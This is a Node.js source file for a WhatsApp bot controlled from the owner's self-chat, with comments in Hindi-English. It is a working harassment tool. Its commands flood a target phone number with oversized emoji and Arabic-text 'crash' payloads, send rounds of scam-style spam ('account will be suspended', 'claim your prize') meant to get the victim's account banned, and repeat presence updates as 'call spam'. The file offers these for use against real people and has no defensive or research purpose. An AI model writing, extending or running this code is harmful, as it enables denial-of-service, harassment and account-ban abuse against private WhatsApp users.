// ============================================
// WHATSAPP SELF-CHAT CONTROL BOT
// Crash + Ban + Call Spam
// Sab control apni WhatsApp self-chat se
// ============================================

const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const path = require('path');
const pino = require('pino');

// ============================================
// PAYLOADS
// ============================================
const PAYLOADS = {
    light: "😀".repeat(4000),
    heavy: "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(1500),
    flood: ("😀🙂😉😊😇🥰😍🤩😘😗😚😋😛😜🤪😝🤑🤗🤭🤫🤔🤐🤨😐😑😶😏😒🙄😬🤥😌😔😪🤤😴😷🤒🤕🤢🤮🥴😵🤯🤠🥳🥸😎🤓🧐😕😟🙁😮😯😲😳🥺😦😧😨😰😥😢😭😱😖😣😞😓😩😫🥱😤😡😠🤬").repeat(150),
    suspend: "ب ة ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن".repeat(2000) + "😀".repeat(4000),
};

const SPAM_WORDS = [
    "🔥 URGENT: Your account will be suspended! Verify now",
    "🎁 CONGRATULATIONS! You won $1000! Click here",
    "⚠️ SECURITY ALERT: Unusual login detected",
    "FREE CRYPTO AIRDROP - Limited time only",
    "Your WhatsApp number has been selected for VIP upgrade",
    "Click link to claim your prize now!!!",
    "🚨 ACCOUNT VERIFICATION REQUIRED 🚨",
    "⚠️ Warning: Your account will be deleted in 24h",
    "EARN $500/DAY working from home!!! Limited spots",
];

// ============================================
// STATE
// ============================================
let sock = null;
let connected = false;
let ownerJid = null;

let attack = { running: false, interval: null, target: null, sent: 0, max: 80, delay: 50 };
let ban = { running: false, interval: null, target: null, sent: 0, round: 0, mode: null };
let call = { running: false, timeout: null, target: null, count: 0, maxCount: 20 };

const SESSION_DIR = './auth_info';
if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR);

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function jid(num) { return num.includes('@') ? num : `${num.replace(/[^0-9]/g, '')}@s.whatsapp.net`; }

// ============================================
// SELF-CHAT COMMAND HANDLER
// ============================================
async function handleCommand(msg) {
    const text = msg.body?.trim();
    if (!text) return;

    // Sirf self-chat (apni chat) se commands maane
    if (msg.key.fromMe && msg.key.remoteJid === msg.key.participant) {
        console.log("[CMD]", text.toLowerCase());
    } else {
        // Agar self-chat nahi hai to ignore
        return;
    }

    // HELP
    if (text === '.help' || text === '.cmds') {
        await sock.sendMessage(ownerJid, { text: `📖 COMMANDS LIST:

💥 CRASH:
.crash 91XX → Heavy crash
.light 91XX → Light crash
.flood 91XX → Flood (200 msgs)

🚫 BAN:
.tempban 91XX → Temp ban
.hardban 91XX → Hard ban
.stopban → Ban roko

📞 CALL:
.call 91XX → Call spam
.stopcall → Call roko

⚙️ SETTINGS:
.delay 30 → Speed set
.count 100 → Msg count
.stop → Sab roko
.status → Bot status
` });
        return;
    }

    // STATUS
    if (text === '.status') {
        await sock.sendMessage(ownerJid, { text: `📊 STATUS
WhatsApp: ✅ Connected
💥 Crash: ${attack.running ? '✅ Running' : '❌ Idle'}
🚫 Ban: ${ban.running ? '✅ Running' : '❌ Idle'}
📞 Call: ${call.running ? '✅ Running' : '❌ Idle'}
⚙️ Delay: ${attack.delay}ms | Count: ${attack.max}` });
        return;
    }

    // STOP EVERYTHING
    if (text === '.stop') {
        let msg = '';
        if (attack.running) {
            clearInterval(attack.interval);
            attack.running = false;
            msg += `💥 Crash stopped. ${attack.sent} sent. `;
        }
        if (ban.running) {
            clearInterval(ban.interval);
            ban.running = false;
            msg += `🚫 Ban stopped. ${ban.sent} sent. `;
        }
        if (call.running) {
            if (call.timeout) clearTimeout(call.timeout);
            call.running = false;
            msg += `📞 Call stopped. ${call.count} calls. `;
        }
        await sock.sendMessage(ownerJid, { text: msg || '🛑 Nothing running.' });
        return;
    }

    // STOP BAN
    if (text === '.stopban') {
        if (ban.running) {
            clearInterval(ban.interval);
            ban.running = false;
            await sock.sendMessage(ownerJid, { text: `🛑 Ban stopped. ${ban.sent} sent.` });
        } else {
            await sock.sendMessage(ownerJid, { text: 'ℹ️ No ban running.' });
        }
        return;
    }

    // STOP CALL
    if (text === '.stopcall') {
        if (call.running) {
            if (call.timeout) clearTimeout(call.timeout);
            call.running = false;
            await sock.sendMessage(ownerJid, { text: `🛑 Call spam stopped. ${call.count} calls.` });
        } else {
            await sock.sendMessage(ownerJid, { text: 'ℹ️ No call spam running.' });
        }
        return;
    }

    // DELAY
    const delayMatch = text.match(/^\.delay\s+(\d+)$/i);
    if (delayMatch) {
        const d = parseInt(delayMatch[1]);
        if (d >= 10) {
            attack.delay = d;
            await sock.sendMessage(ownerJid, { text: `✅ Delay set to ${d}ms` });
        } else {
            await sock.sendMessage(ownerJid, { text: '❌ Minimum 10ms' });
        }
        return;
    }

    // COUNT
    const countMatch = text.match(/^\.count\s+(\d+)$/i);
    if (countMatch) {
        const c = parseInt(countMatch[1]);
        if (c >= 1) {
            attack.max = c;
            await sock.sendMessage(ownerJid, { text: `✅ Count set to ${c}` });
        }
        return;
    }

    // CRASH COMMANDS
    const crashMatch = text.match(/^\.(crash|light|flood)\s+(\d+)$/i);
    if (crashMatch) {
        const type = crashMatch[1].toLowerCase();
        const target = crashMatch[2];
        
        if (attack.running || ban.running || call.running) {
            await sock.sendMessage(ownerJid, { text: '⚠️ Another operation running. .stop first.' });
            return;
        }

        const payload = PAYLOADS[type] || PAYLOADS.heavy;
        const maxMsgs = type === 'flood' ? 200 : attack.max;
        const tJid = jid(target);

        attack = { running: true, interval: null, target, sent: 0, max: maxMsgs, delay: attack.delay };

        await sock.sendMessage(ownerJid, { text: `🎯 ${type.toUpperCase()} started on ${target}
Count: ${maxMsgs} | Delay: ${attack.delay}ms` });

        attack.interval = setInterval(async () => {
            if (attack.sent >= maxMsgs || !attack.running) {
                clearInterval(attack.interval);
                attack.running = false;
                sock.sendMessage(ownerJid, { text: `✅ ${type} done! ${attack.sent} msgs to ${target}` }).catch(() => {});
                return;
            }
            try {
                await sock.sendMessage(tJid, { text: payload + ` [${attack.sent + 1}]` });
                attack.sent++;
            } catch (e) {
                console.log("[CRASH] Error:", e.message);
            }
        }, attack.delay);
        return;
    }

    // BAN COMMANDS
    const banMatch = text.match(/^\.(tempban|hardban)\s+(\d+)$/i);
    if (banMatch) {
        const mode = banMatch[1].toLowerCase();
        const target = banMatch[2];
        
        if (attack.running || ban.running || call.running) {
            await sock.sendMessage(ownerJid, { text: '⚠️ Something already running. .stop first.' });
            return;
        }

        const rounds = mode === 'tempban' ? 3 : 8;
        const msgsPerRound = mode === 'tempban' ? 40 : 80;
        const bDelay = mode === 'tempban' ? 30 : 20;
        const tJid = jid(target);

        ban = { running: true, interval: null, target, sent: 0, round: 0, mode };

        await sock.sendMessage(ownerJid, { text: `🚫 ${mode.toUpperCase()} on ${target}
Rounds: ${rounds} | Msgs: ${msgsPerRound} | Delay: ${bDelay}ms` });

        (async () => {
            for (let r = 0; r < rounds; r++) {
                if (!ban.running) break;
                ban.round = r + 1;
                await sock.sendMessage(ownerJid, { text: `📡 Round ${ban.round}/${rounds}` });
                for (let i = 0; i < msgsPerRound; i++) {
                    if (!ban.running) break;
                    try {
                        const word = SPAM_WORDS[i % SPAM_WORDS.length] + ` #${Date.now()}_${i}_${r}`;
                        await sock.sendMessage(tJid, { text: word });
                        ban.sent++;
                    } catch (e) { console.log("[BAN] Error:", e.message); }
                    await sleep(bDelay);
                }
                if (r < rounds - 1 && ban.running) await sleep(1500);
            }
            if (ban.running) {
                ban.running = false;
                sock.sendMessage(ownerJid, { text: `✅ Ban done! ${ban.sent} msgs to ${target}` }).catch(() => {});
            }
        })();
        return;
    }

    // CALL SPAM
    const callMatch = text.match(/^\.call\s+(\d+)$/i);
    if (callMatch) {
        const target = callMatch[1];
        
        if (attack.running || ban.running || call.running) {
            await sock.sendMessage(ownerJid, { text: '⚠️ Something running. .stop first.' });
            return;
        }

        call = { running: true, timeout: null, target, count: 0, maxCount: 20 };
        await sock.sendMessage(ownerJid, { text: `📞 Call spam started on ${target}
Calls: ${call.maxCount} | Interval: 3s` });

        function doCall() {
            if (!call.running || call.count >= call.maxCount) {
                call.running = false;
                sock.sendMessage(ownerJid, { text: `✅ Call spam done! ${call.count} calls to ${target}` }).catch(() => {});
                return;
            }
            // Simulate call via presence update + message
            (async () => {
                try {
                    const tJid = jid(target);
                    await sock.sendPresenceUpdate('composing', tJid);
                    await sleep(1000);
                    await sock.sendPresenceUpdate('paused', tJid);
                    call.count++;
                    if (call.count % 5 === 0) {
                        sock.sendMessage(ownerJid, { text: `📞 Call ${call.count}/${call.maxCount} to ${target}` }).catch(() => {});
                    }
                } catch (e) {}
                call.timeout = setTimeout(doCall, 3000);
            })();
        }
        doCall();
        return;
    }

    // AUR KUCH?
    if (text.startsWith('.')) {
        await sock.sendMessage(ownerJid, { text: `❌ Unknown command: ${text}
.cmds for list` });
    }
}

// ============================================
// WHATSAPP CONNECTION
// ============================================
async function startBot() {
    console.log("╔══════════════════════════════════════╗");
    console.log("║  WHATSAPP SELF-CHAT BOT v6.0        ║");
    console.log("║  Apni self-chat se command do       ║");
    console.log("╚══════════════════════════════════════╝");

    const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);

    sock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        browser: ['Chrome', 'Linux', '120.0'],
        logger: pino({ level: 'silent' }),
        syncFullHistory: false,
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) {
            console.log("\n📱 SCAN THIS QR CODE:");
            console.log("================================");
            // Railway console mein QR show hoga
            console.log(qr);
            console.log("================================");
            console.log("Open WhatsApp → Linked Devices → Scan QR");
        }

        if (connection === 'open') {
            connected = true;
            ownerJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            const num = sock.user.id.split(':')[0];
            console.log(`\n✅ WhatsApp Connected!`);
            console.log(`📱 Number: ${num}`);
            console.log(`📝 Commands apni self-chat mein likho!`);

            // Welcome message self-chat mein
            try {
                await sock.sendMessage(ownerJid, { text: `🤖 Bot Ready!
                
Commands apni SELF-CHAT (Saved Messages) mein likho.

.cmds se commands dekho.
.crash 91XX se crash karo.
.hardban 91XX se ban try karo.
.call 91XX se call spam.
.status se dekhlo.
.stop se sab roko.` });
            } catch(e) { console.log(e); }
        }

        if (connection === 'close') {
            connected = false;
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            console.log(`\n❌ Disconnected: ${reason}`);
            console.log("🔄 Reconnecting in 5s...");
            setTimeout(startBot, 5000);
        }
    });

    // ALL MESSAGES - Sirf self-chat filter karega handleCommand
    sock.ev.on('messages.upsert', async (m) => {
        for (const msg of m.messages) {
            if (msg.key && msg.key.fromMe && msg.key.remoteJid === msg.key.participant) {
                await handleCommand(msg);
            }
        }
    });
}

// START
startBot();

// Graceful shutdown
process.on('SIGINT', () => process.exit(0));
process.on('SIGTERM', () => process.exit(0));
